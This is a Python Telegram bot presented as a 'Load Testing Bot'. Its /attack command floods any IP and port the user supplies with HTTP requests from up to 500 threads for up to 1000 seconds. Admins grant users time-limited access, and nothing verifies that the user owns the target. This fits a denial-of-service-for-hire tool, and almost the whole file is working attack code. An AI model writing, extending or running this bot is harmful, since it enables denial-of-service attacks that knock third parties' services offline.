import json
import os
import requests
import time
from datetime import datetime, timedelta
from telegram import Update
from telegram.ext import Application, CommandHandler, ContextTypes
from concurrent.futures import ThreadPoolExecutor

# Constants
TELEGRAM_BOT_TOKEN = 'Token' #Replace Your Telegram Bot Token Here
ADMIN_USER_IDS = {959151693}  # Replace with actual admin user IDs
AUTHORIZED_USERS_FILE = 'authorized_users.json'
MAX_THREADS = 500
MAX_DURATION = 1000  # 1000 seconds

# Set the parent directory where the script is located as the working directory
script_dir = os.path.dirname(os.path.abspath(__file__))
os.chdir(script_dir)

# Global variables
attack_running = False
executor = None
authorized_users = {}

# Load or initialize authorized users
def load_authorized_users():
    global authorized_users
    if os.path.exists(AUTHORIZED_USERS_FILE):
        with open(AUTHORIZED_USERS_FILE, 'r') as file:
            authorized_users = json.load(file)
    else:
        authorized_users = {}

def save_authorized_users():
    with open(AUTHORIZED_USERS_FILE, 'w') as file:
        json.dump(authorized_users, file, indent=4)

load_authorized_users()

def is_authorized(user_id):
    """Check if the user is authorized."""
    if user_id in authorized_users:
        expiry = authorized_users[user_id]['expiry']
        return datetime.strptime(expiry, '%Y-%m-%d %H:%M:%S') > datetime.now()
    return False

def is_admin(user_id):
    """Check if the user is an admin."""
    return user_id in ADMIN_USER_IDS

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Send a welcome message when /start is invoked."""
    await update.message.reply_text("Welcome to the Load Testing Bot! Use /attack to start a test.")

async def stop(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Stop any ongoing attack when /stop is invoked."""
    global attack_running
    if attack_running:
        attack_running = False
        if executor:
            executor.shutdown(wait=False)
        await update.message.reply_text("Attack stopped!")
    else:
        await update.message.reply_text("No attack is currently running.")

async def attack(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Simulate an attack when /attack command is invoked."""
    global attack_running, executor

    user_id = update.message.from_user.id
    if not is_authorized(user_id):
        await update.message.reply_text("You are not authorized to perform this action.")
        return
    
    if len(context.args) != 4:
        await update.message.reply_text("Usage: /attack <IP> <port> <time_seconds> <threads>")
        return
    
    target_ip = context.args[0]
    port = context.args[1]
    duration = int(context.args[2])
    threads = int(context.args[3])
    
    # Enforce limits
    if duration > MAX_DURATION:
        duration = MAX_DURATION
        await update.message.reply_text(f"Time exceeded the limit, setting duration to {MAX_DURATION} seconds.")
    
    if threads > MAX_THREADS:
        threads = MAX_THREADS
        await update.message.reply_text(f"Threads exceeded the limit, setting threads to {MAX_THREADS}.")
    
    target_url = f"http://{target_ip}:{port}"

    attack_running = True
    await update.message.reply_text(f"Starting attack on {target_url} with {threads} threads for {duration} seconds.")
    
    # Start the attack
    executor = ThreadPoolExecutor(max_workers=threads)
    start_time = time.time()
    
    def send_requests():
        while time.time() - start_time < duration:
            try:
                response = requests.get(target_url)
                response.raise_for_status()
                print("Request: Success")
            except requests.exceptions.RequestException as e:
                print(f"Request failed: {e}")

    for _ in range(threads):
        if not attack_running:
            break
        executor.submit(send_requests)
    
    await update.message.reply_text("Attack started.")

async def adduser(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Add a user to the authorized list."""
    if not is_admin(update.message.from_user.id):
        await update.message.reply_text("You are not authorized to perform this action.")
        return
    
    if len(context.args) != 2:
        await update.message.reply_text("Usage: /adduser <user_id> <authorization_period>")
        return
    
    user_id = int(context.args[0])
    authorization_period = context.args[1]
    
    try:
        expiry_time = datetime.now() + timedelta(seconds=int(authorization_period))
        authorized_users[user_id] = {
            'expiry': expiry_time.strftime('%Y-%m-%d %H:%M:%S')
        }
        save_authorized_users()
        await update.message.reply_text(f"User {user_id} has been added with authorization period of {authorization_period} seconds.")
    except ValueError:
        await update.message.reply_text("Invalid authorization period. It should be an integer.")

async def removeuser(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Remove a user from the authorized list."""
    if not is_admin(update.message.from_user.id):
        await update.message.reply_text("You are not authorized to perform this action.")
        return
    
    if len(context.args) != 1:
        await update.message.reply_text("Usage: /removeuser <user_id>")
        return
    
    user_id = int(context.args[0])
    
    if user_id in authorized_users:
        del authorized_users[user_id]
        save_authorized_users()
        await update.message.reply_text(f"User {user_id} has been removed.")
    else:
        await update.message.reply_text(f"User {user_id} not found.")

def main():
    """Start the bot and add command handlers."""
    # Create the Application and pass it your bot's token.
    application = Application.builder().token(TELEGRAM_BOT_TOKEN).build()

    # Add command handlers
    application.add_handler(CommandHandler("start", start))
    application.add_handler(CommandHandler("stop", stop))
    application.add_handler(CommandHandler("attack", attack))
    application.add_handler(CommandHandler("adduser", adduser))
    application.add_handler(CommandHandler("removeuser", removeuser))

    # Start the bot
    application.run_polling()

if __name__ == '__main__':
    main()
